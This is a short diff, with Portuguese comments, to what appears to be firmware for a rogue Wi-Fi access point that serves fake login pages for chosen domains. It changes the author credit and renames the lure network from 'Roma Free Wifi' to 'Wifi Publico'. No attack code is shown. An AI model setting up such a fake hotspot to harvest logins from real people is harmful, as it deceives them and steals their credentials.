@@ -1,5 +1,5 @@
 /*
- * Criador Oficial, Antonio Caleb Silva De Lima
+ * Criador Oficial Da Versão Brasileira Antonio Caleb.
  * (Apenas Para Uso Educacional)
  * Configure access point name and up to 3 custom domains and login urls in config.h
  * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
@@ -24,7 +24,7 @@
  * Nome Do Wifi Da Placa
  * ***********************
  */
-const char *ssid="Roma Free Wifi";
+const char *ssid="Wifi Publico";
 
 /*
  *************************
